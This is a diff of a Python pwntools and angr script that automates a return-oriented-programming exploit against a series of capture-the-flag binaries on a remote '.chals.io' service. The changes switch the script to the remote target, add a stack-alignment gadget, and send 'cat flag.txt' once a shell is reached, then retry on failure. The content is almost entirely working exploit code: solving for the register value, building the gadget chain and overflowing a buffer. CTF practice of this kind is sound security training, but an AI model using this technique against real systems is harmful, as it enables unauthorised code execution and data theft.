@@ -14,13 +14,13 @@ context.update(
     terminal=["st"]
 )
 
-
-def exploit(binary: str):
+# MUST BE CALLED STARTING WITH FALSE
+def exploit(binary: str, movaps):
     flag_regex = r'flag\{[^}]+\}'
 
     url = f'ace-service-{binary}.chals.io'
-    # s = remote(url, 443, ssl=True, sni=url)
-    s = process(binary)
+    s = remote(url, 443, ssl=True, sni=url)
+
     if s:
         print('[+] Connected to host')
 
@@ -35,7 +35,7 @@ def exploit(binary: str):
 
     ropy = p.analyses.ROP()
     ropy.find_gadgets()
-   
+
     # finds the value rdi should be to validate
     initial_state = p.factory.blank_state(addr=START)
     rdi = claripy.BVS('rdi', 64)
@@ -51,29 +51,34 @@ def exploit(binary: str):
 
     # chain building
     chain = ropy.set_regs(rdi=win.solver.eval(rdi)).payload_str()
-    #chain += p64(r.find_gadget(['ret'])[0])
-    chain += p64(e.sym['win'])
+    if movaps:
+        chain += p64(r.find_gadget(['ret'])[0])
+    chain += p64(e.sym['win'] + 1)
     print(chain)
     print(cyclic(offset) + chain)
     s.sendline(cyclic(offset) + chain)
-
+    try:
+        if next(e.search(b'/bin/sh')):
+            s.sendline(b'cat flag.txt')
+    except StopIteration:
+        print('[!] SHell not found')
     output = s.recvall(timeout=5)
     print(output)
     flag = re.findall(flag_regex, output.decode())
     if flag:
         return flag[0]
+    else:
+        return exploit(binary, True)
 
 
-def main():  # TEMP FOR TESTING
-    flags = []
-    for i in range(10):
-        print(f"bin-rop-parameters-{i}")
-        flag = exploit(f"bin-rop-parameters-{i}")
-        print(f"\n[!]{flag}\n")
-        flags.append(f"bin-rop-parameters-{i} {flag}")
 
-    for each in flags:
-        print(each + '\n')
-
-
-main()
+# def main():  # TEMP FOR TESTING
+#     flags = []
+#     for i in range(10):
+#         print(f"bin-rop-parameters-{i}")
+#         flag = exploit(f"bin-rop-parameters-{i}",False)
+#         print(f"\n[!]{flag}\n")
+#         flags.append(f"bin-rop-parameters-{i} {flag}")
+#     for each in flags:
+#         print(each)
+# main()
